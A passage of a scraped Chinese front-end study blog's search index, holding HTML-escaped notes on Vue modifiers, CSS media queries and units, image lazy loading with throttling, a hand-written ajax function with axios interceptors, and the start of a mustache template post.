&lt;li&gt;不支持缓存，数据变，直接会触发相应的操作；&lt;/li&gt;
&lt;li&gt;watch支持异步；&lt;/li&gt;
&lt;li&gt;当一个属性发生变化时，需要执行对应的操作；一对多；&lt;/li&gt;
&lt;li&gt;监听数据必须是data中声明过或者父组件传递过来的props中的数据.函数有两个参数，
&lt;ol&gt;
&lt;li&gt;immediate：组件加载立即触发回调函数执行&lt;/li&gt;
&lt;li&gt;deep: 深度监听，为了发现&lt;strong&gt;对象内部值&lt;/strong&gt;的变化，复杂类型的数据时使用。deep无法监听到数组的变动和对象的新增&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;条件渲染&#34;&gt;条件渲染&lt;/h2&gt;
&lt;p&gt;当 &lt;code&gt;v-if&lt;/code&gt; 需要包裹多个元素时候 用 &lt;code&gt;&amp;lt;template&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v-show&lt;/code&gt; 不支持 &lt;code&gt;&amp;lt;template&amp;gt;&lt;/code&gt; 元素，也不支持 &lt;code&gt;v-else&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当 &lt;code&gt;v-if&lt;/code&gt; 与 &lt;code&gt;v-for&lt;/code&gt; 一起使用时，&lt;code&gt;v-for&lt;/code&gt; 具有比 &lt;code&gt;v-if&lt;/code&gt; 更高的优先级&lt;/p&gt;
&lt;h2 id=&#34;事件处理方法&#34;&gt;事件处理方法&lt;/h2&gt;
&lt;p&gt;内联处理器中的方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;div id=&amp;quot;example-3&amp;quot;&amp;gt; 
    &amp;lt;button v-on:click=&amp;quot;say(&#39;hi&#39;,$event)&amp;quot;&amp;gt;Say hi&amp;lt;/button&amp;gt;  
	&amp;lt;button v-on:click=&amp;quot;say(&#39;what&#39;)&amp;quot;&amp;gt;Say what&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt;

new Vue({
  el: &#39;#example-3&#39;,
  methods: {
    say: function (message,event) {
      alert(message)
        // 现在我们可以访问原生事件对象
        if (event) {
          event.preventDefault()
        }
    }
  }
})
//有时也需要在内联语句处理器中访问原始的 DOM 事件。可以用特殊变量 $event 把它传入方法：
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;事情修饰符&#34;&gt;事情修饰符&lt;/h2&gt;
&lt;p&gt;原文博客(https://www.cnblogs.com/xiaoyaoxingchen/p/10405207.html)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.stop&lt;/code&gt;  阻止冒泡（通俗讲就是阻止事件向上级DOM元素传递）&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1626002759503.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.prevent&lt;/code&gt;  阻止默认事件的发生 例如a标签的跳转和表单的提交刷新&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.capture&lt;/code&gt; 捕获冒泡 即有冒泡发生时，有该修饰符的dom元素会先执行&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1626002752776.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.self&lt;/code&gt;  事件有自身才能触发，通常用于避免冒泡事件的影响&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1626002764276.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.once&lt;/code&gt;    只触发一次&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.passive&lt;/code&gt;   对DOM的默认事件进行性能优化&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;. native&lt;/code&gt; 一般给组件绑定事件加的&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 阻止单击事件继续传播 --&amp;gt;
&amp;lt;a v-on:click.stop=&amp;quot;doThis&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;

&amp;lt;!-- 提交事件不再重载页面 --&amp;gt;
&amp;lt;form v-on:submit.prevent=&amp;quot;onSubmit&amp;quot;&amp;gt;&amp;lt;/form&amp;gt;

&amp;lt;!-- 修饰符可以串联 --&amp;gt;
&amp;lt;a v-on:click.stop.prevent=&amp;quot;doThat&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;

&amp;lt;!-- 只有修饰符 --&amp;gt;
&amp;lt;form v-on:submit.prevent&amp;gt;&amp;lt;/form&amp;gt;

&amp;lt;!-- 添加事件监听器时使用事件捕获模式 --&amp;gt;
&amp;lt;!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 --&amp;gt;
&amp;lt;div v-on:click.capture=&amp;quot;doThis&amp;quot;&amp;gt;...&amp;lt;/div&amp;gt;

&amp;lt;!-- 只当在 event.target 是当前元素自身时触发处理函数 --&amp;gt;
&amp;lt;!-- 即事件不是从内部元素触发的 --&amp;gt;
&amp;lt;div v-on:click.self=&amp;quot;doThat&amp;quot;&amp;gt;...&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;按键修饰符&#34;&gt;按键修饰符&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.enter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.tab&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.delete&lt;/code&gt; (捕获“删除”和“退格”键)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.esc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.space&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.up&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.down&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.left&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.right&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;!-- 只有在 `key` 是 `Enter` 时调用 `vm.submit()` --&amp;gt;
    &amp;lt;input v-on:keyup.enter=&amp;quot;submit&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;系统修饰键&#34;&gt;系统修饰键&lt;/h2&gt;
&lt;p&gt;可以用如下修饰符来实现仅在按下相应按键时才触发鼠标或键盘事件的监听器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.ctrl&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.alt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.shift&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.meta&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;exact&#34;&gt;&lt;code&gt;.exact&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;修饰符允许你控制由精确的系统修饰符组合触发的事件。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!-- 即使 Alt 或 Shift 被一同按下时也会触发 --&amp;gt;
&amp;lt;button v-on:click.ctrl=&amp;quot;onClick&amp;quot;&amp;gt;A&amp;lt;/button&amp;gt;

&amp;lt;!-- 有且只有 Ctrl 被按下的时候才触发 --&amp;gt;
&amp;lt;button v-on:click.ctrl.exact=&amp;quot;onCtrlClick&amp;quot;&amp;gt;A&amp;lt;/button&amp;gt;

&amp;lt;!-- 没有任何系统修饰符被按下的时候才触发 --&amp;gt;
&amp;lt;button v-on:click.exact=&amp;quot;onClick&amp;quot;&amp;gt;A&amp;lt;/button&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
">VUE文档 base</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/mei-ti-cha-xun/"" data-c="
          &lt;p&gt;媒体属性是CSS3新增的内容&lt;/p&gt;
&lt;p&gt;媒体属性必须用括号()包起来&lt;/p&gt;
&lt;h5 id=&#34;media-媒体类型and-媒体特性你的样式&#34;&gt;@media 媒体类型and （媒体特性）{你的样式}&lt;/h5&gt;
&lt;h2 id=&#34;最大宽度max-width&#34;&gt;最大宽度max-width&lt;/h2&gt;
&lt;h5 id=&#34;意思是指媒体类型小于或等于指定的宽度时样式生效-如&#34;&gt;意思是指媒体类型小于或等于指定的宽度时，样式生效。如：&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;@media screen and (max-width:480px){
 body {
   display:none;
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;最小宽度min-width&#34;&gt;最小宽度min-width&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;@media screen and (min-width:600px) and (max-width:900px){
  body {background-color:#f5f5f5;}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;多个媒体特性使用&#34;&gt;&lt;strong&gt;多个媒体特性使用&lt;/strong&gt;&lt;/h2&gt;
&lt;h5 id=&#34;media-query中可以包含0到多个表达式&#34;&gt;Media Query中可以包含0到多个表达式&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;/**当屏幕在600px~900px之间时，body的背景色渲染为“#f5f5f5”*/
@media screen and (min-width:600px) and (max-width:900px){
  body {background-color:#f5f5f5;}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;设备屏幕的输出宽度device-width&#34;&gt;&lt;strong&gt;设备屏幕的输出宽度Device Width&lt;/strong&gt;&lt;/h2&gt;
&lt;h5 id=&#34;以根据屏幕设备的尺寸来设置相应的样式或者调用相应的样式文件&#34;&gt;以根据屏幕设备的尺寸来设置相应的样式（或者调用相应的样式文件）&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; media=&amp;quot;screen and (max-device-width:480px)&amp;quot; href=&amp;quot;iphone.css&amp;quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;not关键词&#34;&gt;not关键词&lt;/h2&gt;
&lt;h5 id=&#34;使用关键词not是用来排除某种制定的媒体类型&#34;&gt;使用关键词“not”是用来排除某种制定的媒体类型&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;@media not print and (max-width: 1200px){样式代码}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;only关键词&#34;&gt;only关键词&lt;/h2&gt;
&lt;h5 id=&#34;only用来指定某种特定的媒体类型&#34;&gt;only用来指定某种特定的媒体类型&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; media=&amp;quot;only screen and (max-device-width:240px)&amp;quot; href=&amp;quot;android240.css&amp;quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
"> 媒体查询</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/css-du-liang-dan-wei-rememvwvh/"" data-c="
          &lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1625924625206.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;em&#34;&gt;&lt;strong&gt;em&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;继承父元素大小关系，2em 则为父元素大小的两倍  受自己上级节点影响&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div class=&amp;quot;div&amp;quot; style=&amp;quot;font-size:20px;&amp;quot;&amp;gt;div 标签中的文字大小为 20px
&amp;lt;p class=&amp;quot;p&amp;quot; style=&amp;quot;font-size:2em&amp;quot;&amp;gt;P 标签中的文字大小为 2em
&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;效果如下&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;style&gt;
.div{font-size:20px;}
.p{font-size:2em;}
.span{font-size:0.5em;}
&lt;/style&gt;
&lt;div class=&#34;div&#34; style=&#34;font-size:20px;&#34;&gt;div 标签中的文字大小为 20px
&lt;p class=&#34;p&#34; style=&#34;font-size:2em&#34;&gt;P 标签中的文字大小为 2em
    &lt;span class=&#34;span&#34; style=&#34;font-size:.5em&#34;&gt;span标签中的文字大小为0.5em&lt;/span&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;br&gt;
&lt;h2 id=&#34;rem&#34;&gt;&lt;strong&gt;rem&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;就是相对于根节点来进行缩放，如果有嵌套的关&lt;br&gt;
系，嵌套关系的元素的字体大小始终按照根节点的字体大小进行缩放&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;style&amp;gt;
html{font-size:16px;}
.div{font-size:30px;background-color:pink;padding:50px;}
.p{font-size:1rem;}
.span{font-size:0.5rem;}
&amp;lt;/style&amp;gt;

&amp;lt;div class=&amp;quot;div&amp;quot;&amp;gt;div 标签中的文字大小为 30px
&amp;lt;p class=&amp;quot;p&amp;quot;&amp;gt;P 标签中的文字大小为 1rem
&amp;lt;span class=&amp;quot;span&amp;quot;&amp;gt;span 标 签 中 的 文 字 大 小 为
0.5rem&amp;lt;/span&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&#34;div&#34; style=&#34;font-size:30px&#34;&gt;div 标签中的文字大小为 30px
&lt;p class=&#34;p&#34; style=&#34;font-size:1rem;&#34;&gt;P 标签中的文字大小为 1rem
&lt;span class=&#34;span&#34; style=&#34;font-size:.5rem&#34;&gt;span 标 签 中 的 文 字 大 小 为
0.5rem&lt;/span&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;这个rem继承的是html的font-size  默认为16px 这才是根节点&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;vw-和-vh&#34;&gt;&lt;strong&gt;vw 和 vh&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;视窗的宽度和高度，相当于屏幕宽度和高度的 1%&lt;/p&gt;
&lt;p&gt;处理宽度的时候%单位更合适，处理高度的话 vh 单位更好&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;vmin-和-vmax&#34;&gt;&lt;strong&gt;vmin 和 vmax&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;关于视口高度和宽度两者的最小值或者最大值。&lt;/p&gt;
&lt;p&gt;如果你要让这个元素始终铺满整个视口的可见区域：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;.box { 
height: 100vmax; 
width: 100vmax;
}
&lt;/code&gt;&lt;/pre&gt;
">CSS度量单位 rem、em、vw、vh</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tu-pian-lan-jia-zai/"" data-c="
          &lt;p&gt;实现图片懒加载先了解几个属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;offsetWidth/offsetHeight&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对象的可见宽度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;clientWidth/clientHeight&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内容的可见宽度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;scrollWidth/scrollHeight&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;元素完整的高度和宽度，overflow:hidden的部分也计算在内。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;offsetLeft/offsetTop&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当前元素距浏览器边界的偏移量，以像素为单位。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;clientTop/clientLeft&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这个属性测试下来的结果就是border。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;scrollLeft/scrollTop&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;设置或返回已经滚动到元素的左边界或上边界的像素数。&lt;/p&gt;
&lt;h2 id=&#34;实现代码&#34;&gt;实现代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; //显示器高度 window.innerHeight
    //图片到视窗上的距离 getBoundingClientRect().top
    let imgs=document.querySelectorAll(&#39;img&#39;)
    console.log(imgs);

    window.addEventListener(&#39;scroll&#39;,(e)=&amp;gt;{
        imgs.forEach(v=&amp;gt;{
            const imgtop=v.getBoundingClientRect().top
            console.log(imgtop);
            if(imgtop&amp;lt;window.innerHeight)
            {
              
                let data_src=v.getAttribute(&#39;data-src&#39;)
                 v.setAttribute(&#39;src&#39;,data_src)
            }
            console.log(&#39;触发&#39;);
        })
    })

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;HTML&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;img  data-src=&amp;quot;https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fb1-q.mafengwo.net%2Fs7%2FM00%2F2E%2F37%2FwKgB6lSuHraAYMNtAAXF8ovILuk683.png&amp;amp;refer=http%3A%2F%2Fb1-q.mafengwo.net&amp;amp;app=2002&amp;amp;size=f9999,10000&amp;amp;q=a80&amp;amp;n=0&amp;amp;g=0n&amp;amp;fmt=jpeg?sec=1627892666&amp;amp;t=953e6a19584b6772c33a1b84604fa63d&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;感觉上面这样触发太频繁 加个节流吧&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-JS&#34;&gt;//节流写法
    window.onscroll = throttle(getscroll,200)
    



    //主体函数
    function getscroll() {
  
        let imgs = document.querySelectorAll(&#39;img&#39;)

        imgs.forEach(v=&amp;gt;{
            const imgtop=v.getBoundingClientRect().top
            console.log(imgtop);
            if(imgtop&amp;lt;window.innerHeight)
            {

                let data_src=v.getAttribute(&#39;data-src&#39;)
                 v.setAttribute(&#39;src&#39;,data_src)
            }
          
        })
    }

    //节流函数 过一段时间才触发
    function throttle(fn, delay) {
        let timer = true
        return function () {
            if (!timer) {
                return false
            }
  
            timer=false
            setTimeout(() =&amp;gt; {
            fn()
            console.log(&#39;我是节流&#39;);
            timer = true;
        }, delay)

        }
    }

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1625323851326.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1625323855197.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;不节流效果&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1625323862788.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;节流后的效果  200ms间隔&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1625323858842.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">图片懒加载</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/shou-xie-axios/"" data-c="
          &lt;h2 id=&#34;axios&#34;&gt;axios&lt;/h2&gt;
&lt;p&gt;客户端  请求  服务端&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;请求行&lt;/p&gt;
&lt;p&gt;url&lt;/p&gt;
&lt;p&gt;请求方式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;多个请求头&lt;/p&gt;
&lt;p&gt;域名，cooike，content-Type等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;请求体&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;post方法传的参数&lt;/p&gt;
&lt;p&gt;服务端  响应  客户端&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;响应行&lt;/p&gt;
&lt;p&gt;status statusText&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;多个响应头&lt;/p&gt;
&lt;p&gt;Content-Type:text/html&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;响应体&lt;/p&gt;
&lt;p&gt;数据返回&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xhr&#34;&gt;XHR&lt;/h2&gt;
&lt;p&gt;XMLHttpRequest对象可以和服务器交互 不会刷新网页&lt;/p&gt;
&lt;p&gt;只有XHR和fetch发出的才是ajax请求&lt;/p&gt;
&lt;p&gt;一般的请求就类似跳转和刷新页面&lt;/p&gt;
&lt;p&gt;ajax只是调用监视回调函数并传入响应相关的数据&lt;/p&gt;
&lt;h2 id=&#34;api&#34;&gt;API&lt;/h2&gt;
&lt;p&gt;XMLHttpRequest() //创建XHR对象的构造函数&lt;/p&gt;
&lt;p&gt;status：响应状态码&lt;/p&gt;
&lt;p&gt;statusText：响应状态文本&lt;/p&gt;
&lt;p&gt;onreadystatechange：绑定readyState改变的监听&lt;/p&gt;
&lt;p&gt;open(method,url)：初始化请求&lt;/p&gt;
&lt;p&gt;send(data)：发送请求&lt;/p&gt;
&lt;p&gt;abort()：中断请求&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;手写实现ajax&#34;&gt;手写实现ajax&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;script&amp;gt;
    
    //接口在本地node.js实现
      function getdata()
    {
        console.log(&#39;发送get请求&#39;);
        ajax({
            url:&#39;http://localhost:3000/getposition&#39;,
            parmas:{
               
            name:&#39;fanfan&#39;,
            age:19,
            number:13142278876
            }
        }).then(res=&amp;gt;{
            console.log(res);
        })
    }

    
    //ajax手写实现
     
    function ajax({
        //解构赋值  写好默认值
        url,
        method=&#39;GET&#39;,
        data={},
        parmas={},
    }){
        //返回promise对象
         return new Promise( (resolve,reject)=&amp;gt;{
       
         //对url的处理  有些get请求参数需要拼接另外函数实现拼接
            url+=&#39;?&#39;+pinjie(parmas)
    
             //创建xhr对象
             const request=new XMLHttpRequest()
            //打开连接
             request.open(method,url,true) 
            //转换为JSON对象 
            if(method==&#39;GET&#39;)
            {
                request.send()
            }
           else if(method==&#39;post&#39;)
           {
          
           //发送JSON格式的对象肯定要加请求头 告诉服务器请求体是JSON格式
            request.setRequestHeader(&#39;Content-Type&#39;,&#39;application/json;charset=uft-8&#39;)
            //转换为JSON发送
            request.send(JSON.stringify(data))
           }
    
           //绑定状态改变的监听 从发送变为成功或者失败调用的函数
           request.onreadystatechange=function(){
                //进入判断 如果请求没有完成 直接结束
                if(request.readyState!==4)
                {
                    return 
                }
                //如果响应状态码在 200~299为成功
                const {status,statusText} =request
                //自己加的属性
                let author=&#39;fanfan&#39;
                
                if(status&amp;gt;=200&amp;amp;&amp;amp;status&amp;lt;=299)
                {
                    //准备结果对象response 的其中几条
                    const response={
                        //对应返回的数据可以知道这些东西是什么
                        data:JSON.parse(request.response),
                        status,
                        statusText,
                        //自己添加的属性
                        author
                      
                    }
                    resolve(response)
                }else{
                    //请求失败返回message信息和状态码
                    reject(new Error(&#39;requset error status is &#39;+status))
                }
           }
              
         })
    }

    //拼接参数 for-in解决
    function pinjie(obj)
    {
        let  queryString=&#39;&#39;
        for(let k in obj)
        {
            queryString+= k+&#39;=&#39;+obj[k]+&#39;&amp;amp;&#39;
        }
        //判断有没有值
        if(queryString)
        {
            queryString=queryString.slice(0,queryString.length-1)
        }
        //拼接到url上面
       return  queryString
    }
    
    
&amp;lt;/script&amp;gt;


&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;实现结果&#34;&gt;实现结果&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1624712565528.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;axios特点&#34;&gt;axios特点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本promise的异步ajax请求库&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;浏览器和node都可以使用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;支持请求/响应数据转换&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;支持请求取消&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;多个请求响应拦截器-洋葱模型&#34;&gt;多个请求/响应拦截器  （洋葱模型）&lt;/h2&gt;
&lt;p&gt;请求拦截器 先添加后执行  响应拦截器 先添加先执行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; //添加请求拦截器
    axios.interceptors.request.use(
        config=&amp;gt;{
            console.log(&#39;request interceptor1&#39;);
            return config
        },
        error=&amp;gt;{
            return Promise.reject(error)
        }
    )

     //添加请求拦截器
     axios.interceptors.request.use(
        config=&amp;gt;{
            console.log(&#39;request interceptor2&#39;);
            return config
        },
        error=&amp;gt;{
            return Promise.reject(error)
        }
    )
    //添加响应拦截器
    axios.interceptors.response.use(
        response=&amp;gt;{
            console.log(&#39;response interceptor1&#39;);
            return response
        },error=&amp;gt;{
            return Promise.reject(error)
        }
    )
      //添加响应拦截器
      axios.interceptors.response.use(
        response=&amp;gt;{
            console.log(&#39;response interceptor2&#39;);
            return response
        },error=&amp;gt;{
            return Promise.reject(error)
        }
    )


 //config 就是传的配置文件 不返回的话就传不过去

//response return的结果会给下一个响应拦截器 最后执行.then(res) 将数据传给res


/*request interceptor2
request interceptor1
response interceptor1
response interceptor2*/

&lt;/code&gt;&lt;/pre&gt;
">手写ajax</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/mustache/"" data-c="
          &lt;h1 id=&#34;vue源码学习&#34;&gt;vue源码学习&lt;/h1&gt;
&lt;h2 id=&#34;什么是模板引擎&#34;&gt;什么是模板引擎&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;将数据要变为试图最优雅的解决方案&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;历史上出现过数据变为视图的方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;纯DOM&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数组join法&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ES6的反引号法&lt;/p&gt;
&lt;p&gt;新增的 &lt;code&gt;${a}&lt;/code&gt;的语法糖&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模板引擎&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;数组join法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;//换行一样
var message=&#39;fanfan&#39;
var str=[
    &#39;&amp;lt;li&amp;gt;&#39;,
    &#39;&amp;lt;div&amp;gt;&#39;+message+&#39;&amp;lt;/div&amp;gt;&#39;,
    &#39;&amp;lt;/li&amp;gt;&#39;
].join()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ES6的语法糖&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let a=&#39;fanfan&#39;
list.innerHTTML+=`
	&amp;lt;li&amp;gt;
		&amp;lt;div class=&amp;quot;fanfan&amp;quot;&amp;gt;
				${a}的信息
		&amp;lt;/div&amp;gt;
	&amp;lt;/li&amp;gt;
`
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;mustache库&#34;&gt;mustache库&lt;/h2&gt;
&lt;p&gt;{{ }} 像胡子  所以取名叫胡子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  var user = { name: &amp;quot;Olive&amp;quot;, age: 23, sex: &amp;quot;girl&amp;quot; };
        var template = &amp;quot;My name is  {{name}} ,I&#39;m  {{age}} ,Sex is {{sex}}&amp;quot;;
        var view = Mustache.render(template, user)

   console.log(view);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;简单模式下正则表达式可以实现&lt;/strong&gt;&lt;/p&gt;
